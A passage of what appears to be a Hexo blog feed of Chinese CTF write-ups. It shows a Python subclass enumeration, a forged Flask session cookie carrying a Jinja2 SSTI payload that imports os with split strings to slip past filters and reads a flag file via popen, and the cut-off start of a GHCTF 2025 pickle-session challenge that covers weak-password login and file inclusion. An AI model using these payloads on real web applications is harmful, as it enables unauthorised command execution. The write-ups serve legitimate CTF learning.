&#x27;zip&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._DummyModuleLock&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ModuleLockManager&#x27;&gt;, &lt;class &#x27;_frozen_importlib.ModuleSpec&#x27;&gt;, &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &lt;class &#x27;classmethod&#x27;&gt;, &lt;class &#x27;_frozen_importlib.FrozenImporter&#x27;&gt;, &lt;class &#x27;_frozen_importlib._ImportLockContext&#x27;&gt;, &lt;class &#x27;_thread._localdummy&#x27;&gt;, &lt;class &#x27;_thread._local&#x27;&gt;, &lt;class &#x27;_thread.lock&#x27;&gt;, &lt;class &#x27;_thread.RLock&#x27;&gt;, &lt;class &#x27;_io._IOBase&#x27;&gt;, &lt;class &#x27;_io._BytesIOBuffer&#x27;&gt;, &lt;class &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;, &lt;class &#x27;posix.ScandirIterator&#x27;&gt;, &lt;class &#x27;posix.DirEntry&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.WindowsRegistryFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._LoaderBasics&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespacePath&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external._NamespaceLoader&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.PathFinder&#x27;&gt;, &lt;class &#x27;_frozen_importlib_external.FileFinder&#x27;&gt;, &lt;class &#x27;zipimport.zipimporter&#x27;&gt;, &lt;class &#x27;zipimport._ZipImportResourceReader&#x27;&gt;, &lt;class &#x27;codecs.Codec&#x27;&gt;, &lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;, &lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;, &lt;class &#x27;codecs.StreamReaderWriter&#x27;&gt;, &lt;class &#x27;codecs.StreamRecoder&#x27;&gt;, &lt;class &#x27;_abc._abc_data&#x27;&gt;, &lt;class &#x27;abc.ABC&#x27;&gt;, &lt;class &#x27;dict_itemiterator&#x27;&gt;, &lt;class &#x27;collections.abc.Hashable&#x27;&gt;, &lt;class &#x27;collections.abc.Awaitable&#x27;&gt;, &lt;class &#x27;types.GenericAlias&#x27;&gt;, &lt;class &#x27;collections.abc.AsyncIterable&#x27;&gt;, &lt;class &#x27;async_generator&#x27;&gt;, &lt;class &#x27;collections.abc.Iterable&#x27;&gt;, &lt;class &#x27;bytes_iterator&#x27;&gt;, &lt;class &#x27;bytearray_iterator&#x27;&gt;, &lt;class &#x27;dict_keyiterator&#x27;&gt;, &lt;class &#x27;dict_valueiterator&#x27;&gt;, &lt;class &#x27;list_iterator&#x27;&gt;, &lt;class &#x27;list_reverseiterator&#x27;&gt;, &lt;class &#x27;range_iterator&#x27;&gt;, &lt;class &#x27;set_iterator&#x27;&gt;, &lt;class &#x27;str_iterator&#x27;&gt;, &lt;class &#x27;tuple_iterator&#x27;&gt;, &lt;class &#x27;collections.abc.Sized&#x27;&gt;, &lt;class &#x27;collections.abc.Container&#x27;&gt;, &lt;class &#x27;collections.abc.Callable&#x27;&gt;, &lt;class &#x27;os._wrap_close&#x27;&gt;, &lt;class &#x27;_sitebuiltins.Quitter&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Printer&#x27;&gt;, &lt;class &#x27;_sitebuiltins._Helper&#x27;&gt;, &lt;class &#x27;__future__._Feature&#x27;&gt;, &lt;class &#x27;itertools.accumulate&#x27;&gt;, &lt;class &#x27;itertools.combinations&#x27;&gt;, &lt;class &#x27;itertools.combinations_with_replacement&#x27;&gt;, &lt;class &#x27;itertools.cycle&#x27;&gt;, &lt;class &#x27;itertools.dropwhile&#x27;&gt;, &lt;class &#x27;itertools.takewhile&#x27;&gt;, &lt;class &#x27;itertools.islice&#x27;&gt;, &lt;class &#x27;itertools.starmap&#x27;&gt;, &lt;class &#x27;itertools.chain&#x27;&gt;, &lt;class &#x27;itertools.compress&#x27;&gt;, &lt;class &#x27;itertools.filterfalse&#x27;&gt;, &lt;class &#x27;itertools.count&#x27;&gt;, &lt;class &#x27;itertools.zip_longest&#x27;&gt;, &lt;class &#x27;itertools.permutations&#x27;&gt;, &lt;class &#x27;itertools.product&#x27;&gt;, &lt;class &#x27;itertools.repeat&#x27;&gt;, &lt;class &#x27;itertools.groupby&#x27;&gt;, &lt;class &#x27;itertools._grouper&#x27;&gt;, &lt;class &#x27;itertools._tee&#x27;&gt;, &lt;class &#x27;itertools._tee_dataobject&#x27;&gt;, &lt;class &#x27;operator.itemgetter&#x27;&gt;, &lt;class &#x27;operator.attrgetter&#x27;&gt;, &lt;class &#x27;operator.methodcaller&#x27;&gt;, &lt;class &#x27;reprlib.Repr&#x27;&gt;, &lt;class &#x27;collections.deque&#x27;&gt;, &lt;class &#x27;_collections._deque_iterator&#x27;&gt;, &lt;class &#x27;_collections._deque_reverse_iterator&#x27;&gt;, &lt;class &#x27;_collections._tuplegetter&#x27;&gt;, &lt;class &#x27;collections._Link&#x27;&gt;, &lt;class &#x27;types.DynamicClassAttribute&#x27;&gt;, &lt;class &#x27;types._GeneratorWrapper&#x27;&gt;, &lt;class &#x27;enum.auto&#x27;&gt;, &lt;enum &#x27;Enum&#x27;&gt;, &lt;class &#x27;re.Pattern&#x27;&gt;, &lt;class &#x27;re.Match&#x27;&gt;, &lt;class &#x27;_sre.SRE_Scanner&#x27;&gt;, &lt;class &#x27;sre_parse.State&#x27;&gt;, &lt;class &#x27;sre_parse.SubPattern&#x27;&gt;, &lt;class &#x27;sre_parse.Tokenizer&#x27;&gt;, &lt;class &#x27;functools.partial&#x27;&gt;, &lt;class &#x27;functools._lru_cache_wrapper&#x27;&gt;, &lt;class &#x27;functools.partialmethod&#x27;&gt;, &lt;class &#x27;functools.singledispatchmethod&#x27;&gt;, &lt;class &#x27;functools.cached_property&#x27;&gt;, &lt;class &#x27;re.Scanner&#x27;&gt;, &lt;class &#x27;string.Template&#x27;&gt;, &lt;class &#x27;string.Formatter&#x27;&gt;, &lt;class &#x27;contextlib.ContextDecorator&#x27;&gt;, &lt;class &#x27;contextlib._GeneratorContextManagerBase&#x27;&gt;, &lt;class &#x27;contextlib._BaseExitStack&#x27;&gt;, &lt;class &#x27;typing._Final&#x27;&gt;, &lt;class &#x27;typing._Immutable&#x27;&gt;, &lt;class &#x27;typing.Generic&#x27;&gt;, &lt;class &#x27;typing._TypingEmpty&#x27;&gt;, &lt;class &#x27;typing._TypingEllipsis&#x27;&gt;, &lt;class &#x27;typing.Annotated&#x27;&gt;, &lt;class &#x27;typing.NamedTuple&#x27;&gt;, &lt;class &#x27;typing.TypedDict&#x27;&gt;, &lt;class &#x27;typing.io&#x27;&gt;, &lt;class &#x27;typing.re&#x27;&gt;, &lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;, &lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;, &lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;, &lt;class &#x27;threading._RLock&#x27;&gt;, &lt;class &#x27;threading.Condition&#x27;&gt;, &lt;class &#x27;threading.Semaphore&#x27;&gt;, &lt;class &#x27;threading.Event&#x27;&gt;, &lt;class &#x27;threading.Barrier&#x27;&gt;, &lt;class &#x27;threading.Thread&#x27;&gt;, &lt;class &#x27;warnings.WarningMessage&#x27;&gt;, &lt;class &#x27;warnings.catch_warnings&#x27;&gt;, &lt;class &#x27;select.poll&#x27;&gt;, &lt;class &#x27;select.epoll&#x27;&gt;, &lt;class &#x27;selectors.BaseSelector&#x27;&gt;, &lt;class &#x27;subprocess.CompletedProcess&#x27;&gt;, &lt;class &#x27;subprocess.Popen&#x27;&gt;, &lt;class &#x27;platform._Processor&#x27;&gt;, &lt;class &#x27;_socket.socket&#x27;&gt;, &lt;class &#x27;array.array&#x27;&gt;, &lt;class &#x27;socketserver.BaseServer&#x27;&gt;, &lt;class &#x27;socketserver.ForkingMixIn&#x27;&gt;, &lt;class &#x27;socketserver._NoThreads&#x27;&gt;, &lt;class &#x27;socketserver.ThreadingMixIn&#x27;&gt;, &lt;class &#x27;socketserver.BaseRequestHandler&#x27;&gt;, &lt;class &#x27;datetime.date&#x27;&gt;, &lt;class &#x27;datetime.time&#x27;&gt;, &lt;class &#x27;datetime.timedelta&#x27;&gt;, &lt;class &#x27;datetime.tzinfo&#x27;&gt;, &lt;class &#x27;ast.AST&#x27;&gt;, &lt;class &#x27;weakref.finalize._Info&#x27;&gt;, &lt;class &#x27;weakref.finalize&#x27;&gt;, &lt;class &#x27;_random.Random&#x27;&gt;, &lt;class &#x27;_sha512.sha384&#x27;&gt;, &lt;class &#x27;_sha512.sha512&#x27;&gt;, &lt;class &#x27;ipaddress._IPAddressBase&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV4&#x27;&gt;, &lt;class &#x27;ipaddress._IPv4Constants&#x27;&gt;, &lt;class &#x27;ipaddress._BaseV6&#x27;&gt;, &lt;class &#x27;ipaddress._IPv6Constants&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinStr&#x27;&gt;, &lt;class &#x27;urllib.parse._ResultMixinBytes&#x27;&gt;, &lt;class &#x27;urllib.parse._NetlocResultMixinBase&#x27;&gt;, &lt;class &#x27;calendar._localized_month&#x27;&gt;, &lt;class &#x27;calendar._localized_day&#x27;&gt;, &lt;class &#x27;calendar.Calendar&#x27;&gt;, &lt;class &#x27;calendar.different_locale&#x27;&gt;, &lt;class &#x27;email._parseaddr.AddrlistClass&#x27;&gt;, &lt;class &#x27;_struct.Struct&#x27;&gt;, &lt;class &#x27;_struct.unpack_iterator&#x27;&gt;, &lt;class &#x27;email.charset.Charset&#x27;&gt;, &lt;class &#x27;email.header.Header&#x27;&gt;, &lt;class &#x27;email.header._ValueFormatter&#x27;&gt;, &lt;class &#x27;email._policybase._PolicyBase&#x27;&gt;, &lt;class &#x27;email.feedparser.BufferedSubFile&#x27;&gt;, &lt;class &#x27;email.feedparser.FeedParser&#x27;&gt;, &lt;class &#x27;email.parser.Parser&#x27;&gt;, &lt;class &#x27;email.parser.BytesParser&#x27;&gt;, &lt;class &#x27;email.message.Message&#x27;&gt;, &lt;class &#x27;http.client.HTTPConnection&#x27;&gt;, &lt;class &#x27;_ssl._SSLContext&#x27;&gt;, &lt;class &#x27;_ssl._SSLSocket&#x27;&gt;, &lt;class &#x27;_ssl.MemoryBIO&#x27;&gt;, &lt;class &#x27;_ssl.Session&#x27;&gt;, &lt;class &#x27;ssl.SSLObject&#x27;&gt;, &lt;class &#x27;mimetypes.MimeTypes&#x27;&gt;, &lt;class &#x27;zlib.Compress&#x27;&gt;, &lt;class &#x27;zlib.Decompress&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Compressor&#x27;&gt;, &lt;class &#x27;_bz2.BZ2Decompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMACompressor&#x27;&gt;, &lt;class &#x27;_lzma.LZMADecompressor&#x27;&gt;, &lt;class &#x27;ast.NodeVisitor&#x27;&gt;, &lt;class &#x27;dis.Bytecode&#x27;&gt;, &lt;class &#x27;tokenize.Untokenizer&#x27;&gt;, &lt;class &#x27;inspect.BlockFinder&#x27;&gt;, &lt;class &#x27;inspect._void&#x27;&gt;, &lt;class &#x27;inspect._empty&#x27;&gt;, &lt;class &#x27;inspect.Parameter&#x27;&gt;, &lt;class &#x27;inspect.BoundArguments&#x27;&gt;, &lt;class &#x27;inspect.Signature&#x27;&gt;, &lt;class &#x27;traceback.FrameSummary&#x27;&gt;, &lt;class &#x27;traceback.TracebackException&#x27;&gt;, &lt;class &#x27;logging.LogRecord&#x27;&gt;, &lt;class &#x27;logging.PercentStyle&#x27;&gt;, &lt;class &#x27;logging.Formatter&#x27;&gt;, &lt;class &#x27;logging.BufferingFormatter&#x27;&gt;, &lt;class &#x27;logging.Filter&#x27;&gt;, &lt;class &#x27;logging.Filterer&#x27;&gt;, &lt;class &#x27;logging.PlaceHolder&#x27;&gt;, &lt;class &#x27;logging.Manager&#x27;&gt;, &lt;class &#x27;logging.LoggerAdapter&#x27;&gt;, &lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;, &lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;, &lt;class &#x27;werkzeug.urls.Href&#x27;&gt;, &lt;class &#x27;_hashlib.HASH&#x27;&gt;, &lt;class &#x27;_hashlib.HMAC&#x27;&gt;, &lt;class &#x27;_blake2.blake2b&#x27;&gt;, &lt;class &#x27;_blake2.blake2s&#x27;&gt;, &lt;class &#x27;tempfile._RandomNameSequence&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileCloser&#x27;&gt;, &lt;class &#x27;tempfile._TemporaryFileWrapper&#x27;&gt;, &lt;class &#x27;tempfile.SpooledTemporaryFile&#x27;&gt;, &lt;class &#x27;tempfile.TemporaryDirectory&#x27;&gt;, &lt;class &#x27;urllib.request.Request&#x27;&gt;, &lt;class &#x27;urllib.request.OpenerDirector&#x27;&gt;, &lt;class &#x27;urllib.request.BaseHandler&#x27;&gt;, &lt;class &#x27;urllib.request.HTTPPasswordMgr&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractBasicAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.AbstractDigestAuthHandler&#x27;&gt;, &lt;class &#x27;urllib.request.URLopener&#x27;&gt;, &lt;class &#x27;urllib.request.ftpwrapper&#x27;&gt;, &lt;class &#x27;http.cookiejar.Cookie&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookiePolicy&#x27;&gt;, &lt;class &#x27;http.cookiejar.Absent&#x27;&gt;, &lt;class &#x27;http.cookiejar.CookieJar&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;, &lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;, &lt;class &#x27;dataclasses._HAS_DEFAULT_FACTORY_CLASS&#x27;&gt;, &lt;class &#x27;dataclasses._MISSING_TYPE&#x27;&gt;, &lt;class &#x27;dataclasses._FIELD_BASE&#x27;&gt;, &lt;class &#x27;dataclasses.InitVar&#x27;&gt;, &lt;class &#x27;dataclasses.Field&#x27;&gt;, &lt;class &#x27;dataclasses._DataclassParams&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.Event&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartDecoder&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.multipart.MultipartEncoder&#x27;&gt;, &lt;class &#x27;importlib.abc.Finder&#x27;&gt;, &lt;class &#x27;importlib.abc.Loader&#x27;&gt;, &lt;class &#x27;importlib.abc.ResourceReader&#x27;&gt;, &lt;class &#x27;pkgutil.ImpImporter&#x27;&gt;, &lt;class &#x27;pkgutil.ImpLoader&#x27;&gt;, &lt;class &#x27;hmac.HMAC&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;, &lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;, &lt;class &#x27;_json.Scanner&#x27;&gt;, &lt;class &#x27;_json.Encoder&#x27;&gt;, &lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;, &lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;, &lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;, &lt;class &#x27;werkzeug.user_agent.UserAgent&#x27;&gt;, &lt;class &#x27;werkzeug.useragents._UserAgentParser&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.request.Request&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;, &lt;class &#x27;werkzeug.sansio.response.Response&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;, &lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;, &lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;, &lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;, &lt;class &#x27;werkzeug.test.Client&#x27;&gt;, &lt;class &#x27;decimal.Decimal&#x27;&gt;, &lt;class &#x27;decimal.Context&#x27;&gt;, &lt;class &#x27;decimal.SignalDictMixin&#x27;&gt;, &lt;class &#x27;decimal.ContextManager&#x27;&gt;, &lt;class &#x27;numbers.Number&#x27;&gt;, &lt;class &#x27;uuid.UUID&#x27;&gt;, &lt;class &#x27;_pickle.Pdata&#x27;&gt;, &lt;class &#x27;_pickle.PicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.UnpicklerMemoProxy&#x27;&gt;, &lt;class &#x27;_pickle.Pickler&#x27;&gt;, &lt;class &#x27;_pickle.Unpickler&#x27;&gt;, &lt;class &#x27;pickle._Framer&#x27;&gt;, &lt;class &#x27;pickle._Unframer&#x27;&gt;, &lt;class &#x27;pickle._Pickler&#x27;&gt;, &lt;class &#x27;pickle._Unpickler&#x27;&gt;, &lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;, &lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;, &lt;class &#x27;jinja2.utils._MissingType&#x27;&gt;, &lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;, &lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;, &lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;, &lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;, &lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;, &lt;class &#x27;jinja2.nodes.Node&#x27;&gt;, &lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;, &lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;, &lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;, &lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;, &lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Context&#x27;&gt;, &lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;, &lt;class &#x27;jinja2.runtime.LoopContext&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;, &lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;, &lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;, &lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;, &lt;class &#x27;jinja2.parser.Parser&#x27;&gt;, &lt;class &#x27;jinja2.environment.Environment&#x27;&gt;, &lt;class &#x27;jinja2.environment.Template&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;, &lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;, &lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;, &lt;class &#x27;werkzeug.local.Local&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;, &lt;class &#x27;werkzeug.local._ProxyLookup&#x27;&gt;, &lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;, &lt;class &#x27;difflib.SequenceMatcher&#x27;&gt;, &lt;class &#x27;difflib.Differ&#x27;&gt;, &lt;class &#x27;difflib.HtmlDiff&#x27;&gt;, &lt;class &#x27;pprint._safe_key&#x27;&gt;, &lt;class &#x27;pprint.PrettyPrinter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;, &lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;, &lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;, &lt;class &#x27;werkzeug.routing.Map&#x27;&gt;, &lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;, &lt;class &#x27;gettext.NullTranslations&#x27;&gt;, &lt;class &#x27;click._compat._FixupStream&#x27;&gt;, &lt;class &#x27;click._compat._AtomicFile&#x27;&gt;, &lt;class &#x27;click.utils.LazyFile&#x27;&gt;, &lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;, &lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;, &lt;class &#x27;click.types.ParamType&#x27;&gt;, &lt;class &#x27;click.parser.Option&#x27;&gt;, &lt;class &#x27;click.parser.Argument&#x27;&gt;, &lt;class &#x27;click.parser.ParsingState&#x27;&gt;, &lt;class &#x27;click.parser.OptionParser&#x27;&gt;, &lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;, &lt;class &#x27;click.core.Context&#x27;&gt;, &lt;class &#x27;click.core.BaseCommand&#x27;&gt;, &lt;class &#x27;click.core.Parameter&#x27;&gt;, &lt;class &#x27;flask.signals.Namespace&#x27;&gt;, &lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;, &lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;, &lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;, &lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;, &lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;, &lt;class &#x27;flask.ctx.AppContext&#x27;&gt;, &lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;, &lt;class &#x27;flask.scaffold.Scaffold&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;, &lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;, &lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;, &lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;, &lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;, &lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;, &lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;, &lt;class &#x27;unicodedata.UCD&#x27;&gt;]&quot;</span></span><br><span class="line">result_array = array.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> index,value <span class="keyword">in</span> <span class="built_in">enumerate</span>(result_array):</span><br><span class="line">    result_value = re.sub(<span class="string">r&#x27;[\[\]]&#x27;</span>, <span class="string">&#x27;&#x27;</span>, value)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> <span class="keyword">in</span> result_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;os:&#x27;</span>+<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> result_value:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;eval:&#x27;</span>+<span class="built_in">str</span>(index))</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250627104249762.png" class="" title="image-20250627104249762"><p>测试到133，<code>__init__</code>初始化后为函数，接着寻找<code>__globals__</code>属性，接着寻找<code>__builtins__</code>，通过<code>__import__</code>导入os模块，由于os模块被过滤，’o’’s’绕过过滤，调用popen方法执行命令，read()读取返回结果并回显出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -s &quot;1&quot; -t &quot;&#123;&#x27;name&#x27;:&#x27;admin&#x27;,&#x27;permission&#x27;:&#x27;&#123;&#123;().__class__.__base__.__subclasses__().__getitem__(133).__init__.__globals__.__getitem__(\&#x27;__builtins__\&#x27;).__import__(\&#x27;o\&#x27;\&#x27;s\&#x27;).popen(\&#x27;ca\&#x27;\&#x27;t 4flloog\&#x27;).read()&#125;&#125;&#x27;&#125;&quot;</span><br></pre></td></tr></table></figure><img src="/CTFwp/H&NCTF-2025/image-20250627104808416.png" class="" title="image-20250627104808416">]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GHCTF 2025</title>
      <link href="/CTFwp/GHCTF-2025/"/>
      <url>/CTFwp/GHCTF-2025/</url>
      
        <content type="html"><![CDATA[<h2 id="ezzzz-pickle"><a href="#ezzzz-pickle" class="headerlink" title="ezzzz_pickle"></a>ezzzz_pickle</h2><p>弱口令密码爆破，password：admin123。</p><p>分析源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Hello Page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, admin!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!-- hint:session_pickle --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span><span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">value</span>=<span class="string">&quot;fake_flag.txt&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-login&quot;</span>&gt;</span>读取flag<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>暗示我们是session_pickle.</p><p>这里有个表单，点击读取flag按钮，发现可以进行文件包含。</p><p>试着通过文件包含泄露源码。</p><img src="/CTFwp/GHCTF-2025/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-13%20110827.png" class="" title="屏幕截图 2025-06-13 110827"><p>先分析&#x2F;login路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title 